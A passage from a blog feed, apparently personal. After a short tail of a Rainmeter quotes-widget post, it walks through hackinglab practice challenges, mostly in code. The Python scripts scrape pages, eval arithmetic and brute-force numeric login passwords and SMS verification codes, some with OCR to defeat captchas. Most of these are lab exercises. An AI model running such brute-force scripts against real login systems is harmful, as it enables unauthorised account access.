class="string">'\n'</span>)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure></li></ul><p>将run.vbs添加到开启启动里即可实现开机自动获取</p><p>然后quotes调用的lua脚本如下</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Initialize</span><span class="params">()</span></span></span><br><span class="line"></span><br><span class="line">   CURRENTPATH = SKIN:GetVariable(<span class="string">'CURRENTPATH'</span>)</span><br><span class="line">   Quotes = &#123;&#125;</span><br><span class="line">   Authors = &#123;&#125;</span><br><span class="line">   i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span> line <span class="keyword">in</span> <span class="built_in">io</span>.<span class="built_in">lines</span>(CURRENTPATH..<span class="string">'ListOfQuotes.txt'</span>) <span class="keyword">do</span></span><br><span class="line">      <span class="keyword">if</span> <span class="built_in">string</span>.<span class="built_in">sub</span>(line, <span class="number">1</span>, <span class="number">7</span>) == <span class="string">'&lt;quote&gt;'</span> <span class="keyword">then</span></span><br><span class="line">         i = i + <span class="number">1</span></span><br><span class="line">         Quotes[i] = <span class="built_in">string</span>.<span class="built_in">sub</span>(line, <span class="number">8</span>)</span><br><span class="line">      <span class="keyword">elseif</span> <span class="built_in">string</span>.<span class="built_in">sub</span>(line, <span class="number">1</span>, <span class="number">8</span>) == <span class="string">'&lt;author&gt;'</span> <span class="keyword">then</span></span><br><span class="line">         Authors[i] = <span class="built_in">string</span>.<span class="built_in">sub</span>(line, <span class="number">9</span>)</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">         Quotes[i] = Quotes[i]..<span class="string">'#CRLF#'</span>..line</span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">   <span class="keyword">end</span></span><br><span class="line">   </span><br><span class="line"><span class="keyword">end</span> <span class="comment">--&gt;Initialize</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Update</span><span class="params">()</span></span></span><br><span class="line"></span><br><span class="line">   rand = <span class="built_in">math</span>.<span class="built_in">random</span>(<span class="number">1</span>, #Quotes)</span><br><span class="line">   SKIN:Bang(<span class="string">'!SetOption'</span>, <span class="string">'MeterQuote'</span>, <span class="string">'Text'</span>, Quotes[rand])</span><br><span class="line">   SKIN:Bang(<span class="string">'!SetOption'</span>, <span class="string">'MeterAuthor'</span>, <span class="string">'Text'</span>, Authors[rand])</span><br><span class="line">   <span class="keyword">local</span> f = <span class="built_in">assert</span>(<span class="built_in">io</span>.<span class="built_in">open</span>(CURRENTPATH..<span class="string">'openurl.bat'</span>,<span class="string">'w+'</span>))</span><br><span class="line">   f:<span class="built_in">write</span>(<span class="string">'start '</span>, Authors[rand])</span><br><span class="line">   f:<span class="built_in">close</span>()</span><br><span class="line">   <span class="keyword">return</span> <span class="string">'Quote number: '</span>..rand</span><br><span class="line">   </span><br><span class="line"><span class="keyword">end</span> <span class="comment">--&gt;Update</span></span><br></pre></td></tr></table></figure><h1 id="运行流程"><a href="#运行流程" class="headerlink" title="运行流程"></a>运行流程</h1><ul><li>run.vbs调用init.bat，init.bat执行编译getmessage.py脚本；</li><li>双击桌面quotes拉起main.vbs，main.vbs调用openurl.bat</li><li>刷新quotes时会执行quotes的lua脚本，随机从ListOfQuotes.txt文件中读取一条信息，并将视频地址写入到openurl.bat中</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;p&gt;最近在使用Rainmeter，将quotes(桌面箴言)改进了一下，他就有了如下功能！&lt;/p&gt;
&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;
      
    
    </summary>
    
      <category term="spider" scheme="http://AbelChe.com/categories/spider/"/>
    
    
      <category term="python" scheme="http://AbelChe.com/tags/python/"/>
    
      <category term="Rainmeter" scheme="http://AbelChe.com/tags/Rainmeter/"/>
    
      <category term="lua" scheme="http://AbelChe.com/tags/lua/"/>
    
      <category term="spider" scheme="http://AbelChe.com/tags/spider/"/>
    
  </entry>
  
  <entry>
    <title>WP-hackinglab 脚本关(py脚本)</title>
    <link href="http://AbelChe.com/2019/02/18/Writeup/WP-hackinglab-%E8%84%9A%E6%9C%AC%E5%85%B3%EF%BC%88py%E8%84%9A%E6%9C%AC%EF%BC%89/"/>
    <id>http://AbelChe.com/2019/02/18/Writeup/WP-hackinglab-脚本关（py脚本）/</id>
    <published>2019-02-18T06:27:50.000Z</published>
    <updated>2019-08-15T11:02:50.014Z</updated>
    
    <content type="html"><![CDATA[<h1 id="key又又找不到了"><a href="#key又又找不到了" class="headerlink" title="key又又找不到了"></a><a href="http://lab1.xseclab.com/xss1_30ac8668cd453e7e387c76b132b140bb/index.php" title="key又又找不到了" target="_blank" rel="noopener">key又又找不到了</a></h1><p>点击<code>_到这里找key__</code>后跳转到了没有key的页面，明显的跳转<br><img src="https://i.imgur.com/seRPINp.png" alt><br>抓下来<code>./search_key.php</code>这个页面就好</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">ssion = requests.Session()</span><br><span class="line">url = <span class="string">"http://lab1.xseclab.com/xss1_30ac8668cd453e7e387c76b132b140bb/search_key.php"</span></span><br><span class="line">r = ssion.post(url)<span class="selector-class">.content</span><span class="selector-class">.decode</span>(<span class="string">'utf-8'</span>)</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(r)</span></span></span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/hfeLhcN.png" alt></p><h1 id="快速口算"><a href="#快速口算" class="headerlink" title="快速口算"></a><a href="http://lab1.xseclab.com/xss2_0d557e6d2a4ac08b749b61473a075be1/index.php" title="快速口算" target="_blank" rel="noopener">快速口算</a></h1><p>明显的脚本题，直接抓下来然后计算式子就好<br>用到了正则</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">ssion = requests.Session()</span><br><span class="line">url = <span class="string">'http://lab1.xseclab.com/xss2_0d557e6d2a4ac08b749b61473a075be1/index.php'</span></span><br><span class="line">head = &#123;<span class="string">'cookie'</span>: <span class="string">'PHPSESSID=e26ab2950d310b1bd6761d85d5ed8353'</span>&#125;</span><br><span class="line">r = ssion.post(url,headers=head)<span class="selector-class">.content</span><span class="selector-class">.decode</span>(<span class="string">'utf-8'</span>)</span><br><span class="line">findtext = re.findall(<span class="string">'&lt;br/&gt;\s+(.*?)='</span>, r)</span><br><span class="line">data = &#123;<span class="string">'v'</span>: eval(findtext[<span class="number">0</span>])&#125;</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(ssion.post(url, data=data, headers=head)</span></span><span class="selector-class">.content</span><span class="selector-class">.decode</span>(<span class="string">'utf-8'</span>))</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/oZpegAg.png" alt></p><h1 id="这个题目是空的"><a href="#这个题目是空的" class="headerlink" title="这个题目是空的"></a>这个题目是空的</h1><p>回答空即可，那就是<code>null</code></p><h1 id="怎么就是不弹出key呢？"><a href="#怎么就是不弹出key呢？" class="headerlink" title="怎么就是不弹出key呢？"></a><a href="http://lab1.xseclab.com/xss3_5dcdde90bbe55087eb3514405972b1a6/index.php" title="怎么就是不弹出key呢？" target="_blank" rel="noopener">怎么就是不弹出key呢？</a></h1><p>源码如下:</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line">            function alert(a)&#123;</span><br><span class="line">                <span class="keyword">return</span> false;</span><br><span class="line">            &#125;</span><br><span class="line">            document.write=function()&#123;</span><br><span class="line">                <span class="keyword">return</span> false;</span><br><span class="line">            &#125;</span><br><span class="line">            function prompt(a)&#123;</span><br><span class="line">                <span class="keyword">return</span> false;</span><br><span class="line">            &#125;</span><br><span class="line">            var a=function ()&#123;</span><br><span class="line">               var b=function(p,a,c,k,e,r)&#123;e=function(c)&#123;<span class="keyword">return</span>(c&lt;a?'':e(parseInt(c/a)))+((c=c%a)&gt;<span class="number">35</span>?String.fromCharCode(c+<span class="number">29</span>):c.toString(<span class="number">36</span>))&#125;;<span class="keyword">if</span>(!''.<span class="built_in">replace</span>(/^/,String))&#123;while(c--)r[e(c)]=k[c]|<span class="type">|e</span>(c);k=[function(e)&#123;<span class="keyword">return</span> r[e]&#125;];e=function()&#123;<span class="keyword">return</span>'\\w+'&#125;;c=<span class="number">1</span>&#125;;while(c--)<span class="keyword">if</span>(k[c])p=p.<span class="built_in">replace</span>(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);<span class="keyword">return</span> p&#125;('<span class="number">1</span>s(<span class="number">1</span>e(p,a,c,k,e,r)&#123;e=<span class="number">1</span>e(c)&#123;<span class="number">1</span>d(c&lt;a?\'\':e(<span class="number">1</span>p(c/a)))+((c=c%a)&gt;<span class="number">1</span>q?<span class="number">1</span>f<span class="number">.1</span>j(c+<span class="number">1</span>k):c<span class="number">.1</span>n(<span class="number">1</span>o))&#125;;<span class="number">1</span>g(!\'\'<span class="number">.1</span>h(/^/,<span class="number">1</span>f))&#123;<span class="number">1</span>i(c--)r[e(c)]=k[c]|<span class="type">|e</span>(c);k=[<span class="number">1</span>e(e)&#123;<span class="number">1</span>d r[e]&#125;];e=<span class="number">1</span>e()&#123;<span class="number">1</span>d\'\\\\w+\'&#125;;c=<span class="number">1</span>&#125;;<span class="number">1</span>i(c--)<span class="number">1</span>g(k[c])p=p<span class="number">.1</span>h(<span class="number">1</span>l <span class="number">1</span>m(\'\\\\b\'+e(c)+\'\\\\b\',\'g\'),k[c]);<span class="number">1</span>d p&#125;(\'Y(R(p,a,c,k,e,r)&#123;e=R(c)&#123;S(c&lt;a?\\\'\\\':e(<span class="number">18</span>(c/a)))+((c=c%a)&gt;<span class="number">17</span>?T<span class="number">.16</span>(c+<span class="number">15</span>):c<span class="number">.12</span>(<span class="number">13</span>))&#125;;U(!\\\'\\\'.V(/^/,T))&#123;W(c--)r[e(c)]=k[c]|<span class="type">|e</span>(c);k=[R(e)&#123;S r[e]&#125;];e=R()&#123;S\\\'\\\\\\\\w+\\\'&#125;;c=<span class="number">1</span>&#125;;W(c--)U(k[c])p=p.V(Z <span class="number">11</span>(\\\'\\\\\\\\b\\\'+e(c)+\\\'\\\\\\\\b\\\',\\\'g\\\'),k[c]);S p&#125;(\\\'G(B(p,a,c,k,e,r)&#123;e=B(c)&#123;A c.L(a)&#125;;E(!\\\\\\\'\\\\\\\'.C(/^/,F))&#123;D(c--)r[e(c)]=k[c]|<span class="type">|e</span>(c);k=[B(e)&#123;A r[e]&#125;];e=B()&#123;A\\\\\\\'\\\\\\\\\\\\\\\\w+\\\\\\\'&#125;;c=<span class="number">1</span>&#125;;D(c--)E(k[c])p=p.C(I J(\\\\\\\'\\\\\\\\\\\\\\\\b\\\\\\\'+e(c)+\\\\\\\'\\\\\\\\\\\\\\\\b\\\\\\\',\\\\\\\'g\\\\\\\'),k[c]);A p&#125;(\\\\\\\'t(h(p,a,c,k,e,r)&#123;e=o;n(!\\\\\\\\\\\\\\\'\\\\\\\\\\\\\\\'.m(/^/,o))&#123;l(c--)r[c]=k[c]|<span class="type">|c</span>;k=[h(e)&#123;f r[e]&#125;];e=h()&#123;f\\\\\\\\\\\\\\\'\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\w+\\\\\\\\\\\\\\\'&#125;;c=<span class="number">1</span>&#125;;l(c--)n(k[c])p=p.m(q s(\\\\\\\\\\\\\\\'\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\b\\\\\\\\\\\\\\\'+e(c)+\\\\\\\\\\\\\\\'\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\b\\\\\\\\\\\\\\\',\\\\\\\\\\\\\\\'g\\\\\\\\\\\\\\\'),k[c]);f p&#125;(\\\\\\\\\\\\\\\'<span class="number">1</span> <span class="number">3</span>=<span class="string">"6"</span>;<span class="number">1</span> <span class="number">4</span>=<span class="string">"7"</span>;<span class="number">1</span> <span class="number">5</span>=<span class="string">""</span>;<span class="number">8</span>(<span class="number">1</span> <span class="number">2</span>=<span class="number">0</span>;<span class="number">2</span>&lt;<span class="number">9</span>;<span class="number">2</span>++)&#123;<span class="number">5</span>+=<span class="number">3</span>+<span class="number">4</span>&#125;\\\\\\\\\\\\\\\',j,j,\\\\\\\\\\\\\\\'|<span class="type">u</span>|<span class="type">i</span>|<span class="type">b</span>|<span class="type">c</span>|<span class="type">d</span>|<span class="type">v</span>|<span class="type">x</span>|<span class="type">y</span>|<span class="type">j</span>\\\\\\\\\\\\\\\'.z(\\\\\\\\\\\\\\\'|<span class="type">\\\\\\\\\\\\\\\'),0</span>,&#123;&#125;))\\\\\\\',H,H,\\\\\\\'|<span class="type">||||||||||||||A</span>|<span class="type">|B</span>|<span class="type">|M</span>|<span class="type">|D</span>|<span class="type">C</span>|<span class="type">E</span>|<span class="type">F</span>|<span class="type">|I</span>|<span class="type">|J</span>|<span class="type">G</span>|<span class="type">N</span>|<span class="type">O</span>|<span class="type">|P</span>|<span class="type">Q</span>|<span class="type">K</span>\\\\\\\'.K(\\\\\\\'|<span class="type">\\\\\\\'),0</span>,&#123;&#125;))\\\',X,X,\\\'|<span class="type">|||||||||||||||||||||||||||||||||||S</span>|<span class="type">R</span>|<span class="type">V</span>|<span class="type">W</span>|<span class="type">U</span>|<span class="type">T</span>|<span class="type">Y</span>|<span class="type">13</span>|<span class="type">Z</span>|<span class="type">11</span>|<span class="type">14</span>|<span class="type">12</span>|<span class="type">10</span>|<span class="type">19</span>|<span class="type">1a</span>|<span class="type">1b</span>|<span class="type">1c</span>\\\'<span class="number">.14</span>(\\\'|<span class="type">\\\'),0</span>,&#123;&#125;))\',<span class="number">1</span>t,<span class="number">1</span>u,\'|<span class="type">||||||||||||||||||||||||||||||||||||||||||||||||||||1e</span>|<span class="type">1d</span>|<span class="type">1f</span>|<span class="type">1g</span>|<span class="type">1h</span>|<span class="type">1i</span>|<span class="type">1v</span>|<span class="type">1s</span>|<span class="type">1l</span>|<span class="type">|1m</span>|<span class="type">1n</span>|<span class="type">1o</span>|<span class="type">1r</span>|<span class="type">1k</span>|<span class="type">1j</span>|<span class="type">1q</span>|<span class="type">1p</span>|<span class="type">1w</span>|<span class="type">1x</span>|<span class="type">1y</span>|<span class="type">1z</span>\'<span class="number">.1</span>r(\'|<span class="type">\'),0</span>,&#123;&#125;))',<span class="number">62</span>,<span class="number">98</span>,'|<span class="type">||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||return</span>|<span class="type">function</span>|<span class="type">String</span>|<span class="type">if</span>|<span class="type">replace</span>|<span class="type">while</span>|<span class="type">fromCharCode</span>|<span class="type">29</span>|<span class="type">new</span>|<span class="type">RegExp</span>|<span class="type">toString</span>|<span class="type">36</span>|<span class="type">parseInt</span>|<span class="type">35</span>|<span class="type">split</span>|<span class="type">eval</span>|<span class="type">62</span>|<span class="type">75</span>|<span class="type">53</span>|<span class="type">var</span>|<span class="type">slakfj</span>|<span class="type">teslkjsdflk</span>|<span class="type">for</span>'.<span class="built_in">split</span>('|<span class="type">'),0</span>,&#123;&#125;);</span><br><span class="line">               var d=eval(b);</span><br><span class="line">               alert(<span class="string">"key is first 14 chars"</span>+d);</span><br><span class="line">            &#125;</span><br><span class="line">        &lt;/script&gt;</span><br><span class="line">        &lt;a href=<span class="string">"javascript:a();"</span>&gt;<span class="keyword">_</span>点击之后怎么没反应呢？说好的弹窗呢？__&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>把这几个函数去掉本地上运行下即可</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">alert</span>(<span class="params">a</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">document</span>.write=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">prompt</span>(<span class="params">a</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="逗比验证码第一期"><a href="#逗比验证码第一期" class="headerlink" title="逗比验证码第一期"></a><a href="http://lab1.xseclab.com/vcode1_bcfef7eacf7badc64aaf18844cdb1c46/index.php" title="逗比验证码第一期" target="_blank" rel="noopener">逗比验证码第一期</a></h1><p>脚本爆破密码(这里验证码有无都可):</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">count = <span class="number">0</span></span><br><span class="line">ssion = requests.Session()</span><br><span class="line">url = <span class="string">"http://lab1.xseclab.com//vcode3_9d1ea7ad52ad93c04a837e0808b17097/login.php"</span></span><br><span class="line">head = &#123;<span class="string">'cookie'</span>: <span class="string">'PHPSESSID=cd1c5f7554400cd3978f48d6e5c44c6a'</span>&#125;</span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> range(<span class="number">1000</span>, <span class="number">10000</span>):</span><br><span class="line">    count += <span class="number">1</span></span><br><span class="line">    data = &#123;<span class="string">'username'</span>: <span class="string">'admin'</span>, <span class="string">'pwd'</span>: num, <span class="string">'vcode'</span>: <span class="string">''</span>, <span class="string">'submit'</span>: <span class="string">'submit'</span>&#125;</span><br><span class="line">    r = ssion.post(url, data = data, headers = head).content.decode(<span class="string">'utf-8'</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'pwd error'</span> <span class="keyword">in</span> r:</span><br><span class="line">        print(<span class="string">"[%d]\033[1;31mpwd: error %d\033[0m"</span> % (count, num))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'vcode error'</span> <span class="keyword">in</span> r:</span><br><span class="line">        print(<span class="string">'[%d]\033[1;31mvcode error pwd:%d\033[0m'</span> % (count, num))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'error'</span> not <span class="keyword">in</span> r:</span><br><span class="line">        print(<span class="string">'[%d]\033[1;32mpassword is: %d\033[0m'</span> % (count, num))</span><br><span class="line">        print(r)</span><br><span class="line">        <span class="keyword">exit</span>(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/Ca8FJdz.png" alt></p><h1 id="逗比验证码第二期"><a href="#逗比验证码第二期" class="headerlink" title="逗比验证码第二期"></a><a href="http://lab1.xseclab.com/vcode2_a6e6bac0b47c8187b09deb20babc0e85/index.php" title="逗比验证码第二期" target="_blank" rel="noopener">逗比验证码第二期</a></h1><p>一样的脚本爆破(这里不要填验证码):</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">ssion = requests.Session()</span><br><span class="line">url = <span class="string">'http://lab1.xseclab.com/vcode2_a6e6bac0b47c8187b09deb20babc0e85/login.php'</span></span><br><span class="line">head = &#123;<span class="string">'cookie'</span>: <span class="string">'PHPSESSID=e26ab2950d310b1bd6761d85d5ed8353'</span>&#125;</span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> range(<span class="number">1000</span>, <span class="number">10000</span>):</span><br><span class="line">    data = &#123;<span class="string">'username'</span>: <span class="string">'admin'</span>, <span class="string">'pwd'</span>: num, <span class="string">'vcode'</span>: <span class="string">''</span>, <span class="string">'submit'</span>: <span class="string">'submit'</span>&#125;</span><br><span class="line">    r = ssion.post(url, data=data, headers=head).content.decode(<span class="string">'utf-8'</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">u'error'</span> <span class="keyword">in</span> r:</span><br><span class="line">        print(<span class="string">'\r\033[1;31m[-]I\'m trying!!! PROGESS:%d\033[0m'</span> % num, end=<span class="string">""</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">u'error'</span> not <span class="keyword">in</span> r:</span><br><span class="line">        print(<span class="string">'\n\033[1;32m[+]Find password! %d\033[0m'</span> % num)</span><br><span class="line">        print(<span class="string">'\033[1;36m'</span>, r, <span class="string">'\033[0m'</span>)</span><br><span class="line">        <span class="keyword">exit</span>(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/xoJ8bo1.png" alt></p><h1 id="逗比的验证码第三期-SESSION"><a href="#逗比的验证码第三期-SESSION" class="headerlink" title="逗比的验证码第三期(SESSION)"></a><a href="http://lab1.xseclab.com/vcode3_9d1ea7ad52ad93c04a837e0808b17097/index.php" title="逗比的验证码第三期(SESSION)" target="_blank" rel="noopener">逗比的验证码第三期(SESSION)</a></h1><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">ssion = requests.Session()</span><br><span class="line">url = <span class="string">'http://lab1.xseclab.com/vcode3_9d1ea7ad52ad93c04a837e0808b17097/login.php'</span></span><br><span class="line">head = &#123;<span class="string">'cookie'</span>: <span class="string">'PHPSESSID=e26ab2950d310b1bd6761d85d5ed8353'</span>&#125;</span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> range(<span class="number">1000</span>, <span class="number">10000</span>):</span><br><span class="line">    data = &#123;<span class="string">'username'</span>: <span class="string">'admin'</span>, <span class="string">'pwd'</span>: num, <span class="string">'vcode'</span>: <span class="string">''</span>, <span class="string">'submit'</span>: <span class="string">'submit'</span>&#125;</span><br><span class="line">    r = ssion.post(url, data=data, headers=head).content.decode(<span class="string">'utf-8'</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">u'error'</span> <span class="keyword">in</span> r:</span><br><span class="line">        print(<span class="string">'\r\033[1;31m[-]I\'m trying!!! PROGESS:%d\033[0m'</span> % num, end=<span class="string">""</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">u'error'</span> not <span class="keyword">in</span> r:</span><br><span class="line">        print(<span class="string">'\n\033[1;32m[+]Find password! %d\033[0m'</span> % num)</span><br><span class="line">        print(<span class="string">'\033[1;36m'</span>, r, <span class="string">'\033[0m'</span>)</span><br><span class="line">        <span class="keyword">exit</span>(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/kZEqUM7.png" alt></p><h1 id="逗比的手机验证码"><a href="#逗比的手机验证码" class="headerlink" title="逗比的手机验证码"></a><a href="http://lab1.xseclab.com/vcode5_mobi_5773f3def9f77f439e058894cefc42a8/" title="逗比的手机验证码" target="_blank" rel="noopener">逗比的手机验证码</a></h1><p>获取验证码后提交，发现需要以13388886667提交，<br>那么:获取验证码，提交，bp抓到，改手机号，提交即可</p><h1 id="基情燃烧的岁月"><a href="#基情燃烧的岁月" class="headerlink" title="基情燃烧的岁月"></a><a href="http://lab1.xseclab.com/vcode6_mobi_b46772933eb4c8b5175c67dbc44d8901/" title="基情燃烧的岁月" target="_blank" rel="noopener">基情燃烧的岁月</a></h1><p>先爆破验证码:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">ssion = requests.Session()</span><br><span class="line">url = <span class="string">'http://lab1.xseclab.com/vcode6_mobi_b46772933eb4c8b5175c67dbc44d8901/login.php'</span></span><br><span class="line">head = &#123;<span class="string">'cookie'</span>: <span class="string">'PHPSESSID=e26ab2950d310b1bd6761d85d5ed8353'</span>&#125;</span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> range(<span class="number">100</span>, <span class="number">1000</span>):</span><br><span class="line">    data = &#123;<span class="string">'username'</span>: <span class="string">'13388886666'</span>, <span class="string">'vcode'</span>: num, <span class="string">'Login'</span>: <span class="string">'submit'</span>&#125;</span><br><span class="line">    r = ssion.post(url, data=data, headers=head).content.decode(<span class="string">'utf-8'</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">u'error'</span> <span class="keyword">in</span> r:</span><br><span class="line">        print(<span class="string">'\r\033[1;31m[-]I\'m trying!!! PROGESS:%d\033[0m'</span> % num, end=<span class="string">""</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">u'error'</span> not <span class="keyword">in</span> r:</span><br><span class="line">        print(<span class="string">'\n\033[1;32m[+]Find vcode! %d\033[0m'</span> % num)</span><br><span class="line">        print(<span class="string">'\033[1;36m'</span>, r, <span class="string">'\033[0m'</span>)</span><br><span class="line">        <span class="keyword">exit</span>(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/WCRcYrG.png" alt><br>换手机号13399999999继续爆破:<br><img src="https://i.imgur.com/j74pYVA.png" alt></p><h1 id="验证码识别"><a href="#验证码识别" class="headerlink" title="验证码识别"></a><a href="http://lab1.xseclab.com/vcode7_f7947d56f22133dbc85dda4f28530268/index.php" title="验证码识别" target="_blank" rel="noopener">验证码识别</a></h1><p>查看源码以及提示中可以看到，验证码是三位数100-999<br>查看源码，分析js脚本可得知，每次提交需要点击获取验证码<br>脚本如下:</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> pytesseract</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://lab1.xseclab.com/vcode7_f7947d56f22133dbc85dda4f28530268/login.php'</span></span><br><span class="line">urlmobi = <span class="string">'http://lab1.xseclab.com/vcode7_f7947d56f22133dbc85dda4f28530268/mobi_vcode.php'</span></span><br><span class="line">imageurl = <span class="string">'http://lab1.xseclab.com/vcode7_f7947d56f22133dbc85dda4f28530268/vcode.php'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> num <span class="built_in">in</span> range(<span class="number">100</span>, <span class="number">1000</span>):</span><br><span class="line">    s = requests.Session()</span><br><span class="line">    r = s.post(urlmobi, <span class="keyword">data</span>=&#123;<span class="string">'getcode'</span>: <span class="string">'1'</span>, <span class="string">'mobi'</span>: <span class="string">'13388886666'</span>&#125;)</span><br><span class="line">    r = 